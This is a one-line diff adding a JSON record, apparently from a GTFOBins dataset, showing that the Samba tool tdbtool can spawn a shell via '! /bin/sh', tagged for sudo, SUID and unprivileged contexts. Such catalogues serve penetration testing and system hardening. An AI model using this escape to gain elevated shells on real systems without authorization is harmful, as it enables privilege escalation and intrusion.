@@ -1,0 +1,1 @@
+{"title": "tdbtool", "source": "gtfobins", "source_label": "GTFOBins", "path": "tdbtool", "html": "<h1>tdbtool</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">tdbtool\n! /bin/sh</code></pre>", "excerpt": "tdbtool Shell tdbtool ! /bin/sh", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
